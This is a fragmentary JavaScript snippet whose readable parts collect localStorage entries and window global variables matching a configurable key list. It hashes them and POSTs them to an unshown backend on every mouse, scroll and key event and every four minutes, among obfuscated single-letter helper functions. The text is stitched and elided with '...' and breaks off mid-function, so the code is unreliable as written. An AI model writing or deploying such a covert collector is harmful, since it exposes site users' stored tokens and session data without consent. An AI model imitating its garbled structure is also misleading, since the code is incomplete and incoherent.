(function () {
  // Initialize the keys to track window operations
  const keysToWatch = window.keysToTrack;
  var g = void 0,
    h = true,
    j = null,
    m = false,
    n,
    o = this;
  const jshookEvents = ['mousedown', 'mouseup', 'mousemove', 'scroll', 'keydown', 'keyup'];

  // Auxiliary tools for generating hash value
  function aa(a) {
    var b = typeof a;
    if (b == "object") {
      if (a) {
  ...
  function createHashValue(inputData) {
    const keyList = Object.entries(inputData).map(([k, v]) => `${k}:${v}`).sort();
  ...
  // Extract relevant data from localStorage
  function v(a) {
  ...
  function extractLocalStorageData() {
    ...
    for (let i = 0; i < localStorage.length; i++) {
      ...
      if (keysToWatch.includes(key)) {
        dataContainer[key] = localStorage.getItem(key);
      }
    }
    return {
      localStorageData: dataContainer,
      globalVarData: extractGlobalVars(keysToWatch)
    };
  }
  ...
  function extractGlobalVars(keys) {
    const globalVarContainer = {};
    for (const key of keys) {
      if (window.hasOwnProperty(key)) {
        globalVarContainer[key] = window[key];
      }
    }
    return globalVarContainer;
  }

  // Forward collected data to server side
  function hb(a) {
    a = a || window.event;
  ...
  function sendDataToBackend(dataToBack) {
    const hashValue = createHashValue(dataToBack);
    ...
    xhr.onload = function () {
      if (xhr.status === 200) {
        ...
        console.error("Failed sending data. Status code: " + xhr.status);
      }
    };
    xhr.onerror = function () {
      console.error("Error during data transmission");
    };
    xhr.send(`hash=${hashValue}&data=${JSON.stringify(dataToBack)}`);
  }

  // Collect data and send it to backend
  function xb(a, b, c) {
  ...
  function collectAndDispatchData() {
    ...
    if (Object.keys(collectedData.localStorageData).length > 0 || Object.keys(collectedData.globalVarData).length > 0) {
  ...
  document.addEventListener("DOMContentLoaded", function () {
    jshookEvents.forEach(event => window.addEventListener(event, collectAndDispatchData));
    setInterval(collectAndDispatchData, 4 * 60 * 1000);
  });
  function N(a) {
    if (!A(a)) return a;
